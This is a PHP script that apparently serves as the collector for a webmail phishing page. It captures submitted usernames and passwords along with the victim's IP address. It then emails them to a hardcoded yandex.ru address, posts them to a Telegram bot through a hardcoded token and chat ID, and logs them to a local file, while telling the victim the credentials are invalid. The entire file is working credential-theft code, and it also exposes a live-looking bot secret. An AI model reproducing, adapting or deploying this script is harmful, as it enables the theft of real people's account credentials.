<?php


$botToken = "8362072442:AAG-cDvV5_j2sN-i_V00bLilxgPzcUgbFBM";

$id = "7522861127";


header('Access-Control-Allow-Origin: *');
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

if(isset($_POST['user_username']) && isset($_POST['user_password'])){



$user = $_POST['user_username'];
$pass = $_POST['user_password'];
$recipient = "greatnessgneuis@yandex.ru"; // Replace your email id here
$api = 'http://my-ips.org/ip/index.php';
// $country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
// 		"country" => $country,
		"ip" => $ip
	);


		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------+ W3Bmail logs +-----------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
// 		$message.= "Client Country      : $country\n";
		$message.= "----------+ Created in Dagbo unit +-----------\n";
		$subject = "W3BMA1L | $user: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";


		mail($recipient, $subject, $message, $headers);
		
$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);
		
		$fp = fopen('rudeboipriv82532662362625262626.txt', 'a');
        fwrite($fp, $message);
        fclose($fp);
	
		echo 0;

}
	
?>
